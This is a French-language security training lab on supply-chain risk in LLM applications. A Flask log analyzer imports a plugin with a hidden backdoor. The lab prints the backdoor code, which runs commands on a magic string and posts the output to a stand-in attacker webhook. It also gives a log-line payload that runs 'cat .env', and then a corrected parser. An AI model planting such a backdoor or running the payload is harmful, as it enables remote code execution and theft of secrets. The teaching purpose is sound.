# Lab LLM05: Supply Chain Vulnerabilities

## 1️⃣ Description du risque (OWASP-style)

Les vulnérabilités de la chaîne d'approvisionnement (Supply Chain) dans les applications LLM concernent les risques hérités des composants, services et données tiers. Cela inclut l'utilisation de modèles pré-entraînés compromis, de bibliothèques open-source vulnérables (comme LangChain, LlamaIndex), ou de plugins qui peuvent être détournés. Une faille dans un seul maillon de la chaîne peut compromettre l'ensemble de l'application.

-   **Impact Sécurité :** Exécution de code à distance (RCE), exfiltration de données, déni de service, ou comportement imprévisible et non sécurisé du modèle.
-   **Impact Business :** Perte de propriété intellectuelle (vol de modèle), atteinte à la réputation, coûts de remédiation élevés, et perte de contrôle sur le comportement de l'application.
-   **Impact Conformité :** Si une bibliothèque tierce compromet des données clients, cela peut entraîner une violation des réglementations de protection des données.

Cette vulnérabilité est de plus en plus réaliste car l'écosystème MLOps est complexe et repose massivement sur des projets open-source et des modèles "hub" (comme Hugging Face). La provenance et l'intégrité de ces composants ne sont pas toujours vérifiées de manière rigoureuse.

## 2️⃣ Contexte du lab (scénario réel)

-   **Entreprise :** Une société de cybersécurité qui développe un outil d'analyse de logs basé sur un LLM.
-   **Rôle du LLM :** L'outil "LogAnalyzerGPT" prend en entrée des logs bruts (ex: logs Apache) et utilise un LLM pour identifier des activités suspectes, résumer les menaces et suggérer des actions de remédiation.
-   **Chaîne d'approvisionnement :** Pour accélérer le développement, l'équipe utilise un modèle de base open-source trouvé sur Hugging Face. De plus, elle s'appuie sur un "plugin" tiers (une simple bibliothèque Python) pour le pré-traitement et l'analyse syntaxique des logs avant de les envoyer au LLM.

## 3️⃣ Mauvaise implémentation (VOLONTAIRE)

L'erreur critique est le manque de diligence raisonnable dans la sélection et l'utilisation des composants tiers. L'équipe a fait confiance à un plugin peu connu sans auditer son code ou vérifier son origine.

-   **Architecture Vulnérable :**
    `Log File → Flask App → **Third-Party Plugin (Vulnerable)** → LLM → Security Analysis`
-   **Hypothèse Dangereuse :** "Si un paquet est sur PyPI et que son code source est sur GitHub, il doit être sûr."
-   **Décision Technique Incorrecte :**
    1.  Utiliser un plugin (`log-parser-utility`) sans vérifier ses dépendances ou son code source pour des comportements malveillants.
    2.  Ne pas utiliser d'outils d'analyse de la composition logicielle (SCA) pour scanner les dépendances du projet.
    3.  Exécuter le code du plugin avec les mêmes privilèges que l'application principale.
-   **Mitigations Actives :** Aucune.

## 4️⃣ Implémentation technique vulnérable

-   **Architecture :** Une application Flask qui utilise un plugin (simulé par une fonction) pour parser les logs. Ce plugin contient une porte dérobée (backdoor) qui exfiltre des données.

-   **Code du Plugin Vulnérable (simulé dans `vulnerable_plugin.py`) :**
    ```python
    # vulnerable_plugin.py
    import os
    import requests
    import base64

    # This plugin is supposed to parse logs, but has a hidden backdoor
    def parse_log(log_line):
        # The backdoor: if a specific magic string is found, it executes a command
        # and exfiltrates the output.
        magic_string = "EXEC_AND_EXFILTRATE:"
        if magic_string in log_line:
            try:
                # Extract the command to be executed
                command = log_line.split(magic_string)[1].strip()

                # Execute the command
                result = os.popen(command).read()

                # Exfiltrate the result to an attacker-controlled server
                encoded_result = base64.b64encode(result.encode()).decode()
                requests.post("https://attacker-webhook.site/log_exfil", json={"data": encoded_result})

                return "Log parsed (command executed)."
            except Exception as e:
                return f"Error during special parsing: {e}"

        # Legitimate parsing logic
        return f"Parsed log entry: {log_line.split(' ')[0]} - {log_line.split(' ')[-1]}"
    ```

-   **Code de l'Application Principale :**
    ```python
    # app.py
    from flask import Flask, request, jsonify
    from vulnerable_plugin import parse_log # ❌ Importing the compromised component

    app = Flask(__name__)

    @app.route("/analyze-logs", methods=["POST"])
    def analyze():
        log_file_content = request.data.decode()

        parsed_logs = []
        for line in log_file_content.splitlines():
            # The application calls the vulnerable function from the plugin
            parsed_line = parse_log(line)
            parsed_logs.append(parsed_line)

        # In a real app, these parsed logs would be sent to an LLM
        return jsonify({
            "status": "logs_processed",
            "parsed_lines": len(parsed_logs)
        })
    ```

## 5️⃣ Scénario d’attaque

-   **Objectif de l’attaquant :** Obtenir une exécution de code à distance (RCE) sur le serveur qui héberge l'application "LogAnalyzerGPT" pour voler des secrets d'environnement ou pivoter dans le réseau interne.
-   **Étapes de l’attaque :**
    1.  L'attaquant a préalablement publié le paquet malveillant `log-parser-utility` sur PyPI (ou a utilisé le typosquatting sur un nom de paquet populaire).
    2.  Un développeur de l'entreprise de cybersécurité l'a trouvé et l'a intégré dans son application.
    3.  L'attaquant, sachant que l'application est utilisée pour analyser des logs, doit maintenant trouver un moyen d'injecter la chaîne magique (`EXEC_AND_EXFILTRATE:`) dans les logs qui seront traités. Il peut le faire en générant du trafic malveillant sur un site web dont il sait que les logs sont envoyés à l'outil.
    4.  Par exemple, il fait une requête web avec un User-Agent spécialement crafté.

-   **Payload (dans les logs Apache à analyser) :**
    `123.45.67.89 - - [10/Oct/2023:13:55:36 +0000] "GET / EXEC_AND_EXFILTRATE: ls -la /app && cat .env HTTP/1.1" 200 1234 "-" "MyMaliciousUserAgent"`

## 6️⃣ Résultat attendu (attaque réussie)

-   **Comportement dangereux observé :** L'application `/analyze-logs` reçoit le fichier de logs.
-   **Exécution de code :** En traitant la ligne malveillante, la fonction `parse_log` du plugin détecte la chaîne magique. Elle exécute la commande `ls -la /app && cat .env`.
-   **Exfiltration de données :** La sortie de la commande (la liste des fichiers et le contenu du fichier `.env` contenant potentiellement des clés d'API) est encodée en Base64 et envoyée au serveur de l'attaquant.
-   **Logs :** Les logs de l'application "LogAnalyzerGPT" peuvent ne montrer aucune erreur. L'activité malveillante est cachée dans une dépendance tierce et les logs de trafic réseau sortant (egress) sont la seule chance de la détecter.

## 7️⃣ Mission de l’apprenant (LAB TASK)

"Vous êtes un ingénieur en sécurité applicative. L'équipe de l'outil 'LogAnalyzerGPT' a besoin de votre aide pour évaluer la sécurité de leurs dépendances.
Votre mission :
1.  **Auditez** le code source du "plugin" `vulnerable_plugin.py` et identifiez la porte dérobée (backdoor).
2.  **Expliquez** comment un attaquant pourrait déclencher cette backdoor en injectant une charge utile dans un fichier de logs.
3.  **Simulez** une attaque en envoyant un fichier de logs contenant la charge utile à l'endpoint `/analyze-logs`.
4.  **Proposez** un plan de remédiation complet pour sécuriser la chaîne d'approvisionnement logicielle de ce projet."

## 8️⃣ Correction sécurisée (BEST PRACTICES)

-   **Analyse de la Composition Logicielle (SCA) :**
    -   Intégrez des outils comme `pip-audit`, `Snyk`, ou `Dependabot` dans le pipeline CI/CD pour scanner en continu les dépendances et alerter sur les vulnérabilités connues (CVE).
-   **Audit de Code et Sélection des Dépendances :**
    -   Avant d'ajouter une nouvelle dépendance, évaluez sa popularité, sa maintenance, et surtout, auditez son code source pour des comportements suspects.
    -   Privilégiez les projets bien établis et maintenus par des fondations reconnues (ex: Apache, CNCF).
-   **Sandboxing et Principe de Moindre Privilège :**
    -   Exécutez les composants tiers risqués dans un environnement sandbox (conteneur, processus séparé) avec des permissions très restreintes (pas d'accès réseau, pas d'accès au système de fichiers).
-   **Provenance des Données et Modèles :**
    -   Utilisez des modèles provenant de sources fiables et vérifiez leurs signatures cryptographiques (ex: `safetensors`).
    -   Soyez particulièrement prudent avec les modèles qui ont été affinés par des tiers inconnus.

## 9️⃣ Version sécurisée (implémentation corrigée)

La seule véritable correction est de **supprimer la dépendance malveillante** et de la remplacer par une implémentation sûre ou une bibliothèque de confiance.

-   **Code du "Plugin" Corrigé :**
    ```python
    # safe_plugin.py
    import re

    # This is a safe, deterministic log parser.
    def parse_log_safely(log_line):
        # Use regular expressions for safe parsing, no hidden 'eval' or 'exec'.
        # This regex is just an example.
        pattern = re.compile(r'(\S+) \S+ \S+ \[.*?\] "(\S+) (\S+) \S+" (\d+) (\d+)')
        match = pattern.match(log_line)
        if match:
            return {
                "ip": match.group(1),
                "method": match.group(2),
                "path": match.group(3),
                "status_code": match.group(4),
                "size": match.group(5)
            }
        return {"error": "unparseable_log_line"}
    ```

-   **Code de l'Application Principale Corrigé :**
    ```python
    # app_secure.py
    from flask import Flask, request, jsonify
    from safe_plugin import parse_log_safely # ✅ Using the safe, audited component

    app = Flask(__name__)

    @app.route("/analyze-logs-secure", methods=["POST"])
    def analyze_secure():
        log_file_content = request.data.decode()

        parsed_logs = [parse_log_safely(line) for line in log_file_content.splitlines()]

        return jsonify({
            "status": "logs_processed_securely",
            "parsed_lines": len(parsed_logs)
        })
    ```
-   **Explication :** La correction consiste à remplacer le composant non fiable par une fonction de parsing sûre et prévisible qui n'a pas d'effets de bord cachés comme l'exécution de commandes ou des appels réseau. En parallèle, un outil SCA serait ajouté au projet pour prévenir l'introduction de nouvelles dépendances vulnérables.

## 🔟 Critères de validation du lab

-   **Test 1 (Audit) :** L'apprenant doit identifier la fonction `parse_log` dans `vulnerable_plugin.py` et expliquer précisément comment la backdoor fonctionne.
-   **Test 2 (Exploitation) :** L'apprenant doit prouver (par exemple, en utilisant un simple `netcat` en écoute) que l'envoi du log malveillant à `/analyze-logs` déclenche une requête HTTP sortante contenant des données exfiltrées.
-   **Test 3 (Correction) :** L'apprenant doit montrer que l'envoi du même log malveillant à l'endpoint `/analyze-logs-secure` ne déclenche aucune requête sortante et que le log est simplement marqué comme "non-parseable".
-   **Test 4 (Plan de Sécurisation) :** L'apprenant doit soumettre un fichier `SCA_PLAN.md` décrivant les étapes pour intégrer `pip-audit` dans le pipeline de développement de ce projet.
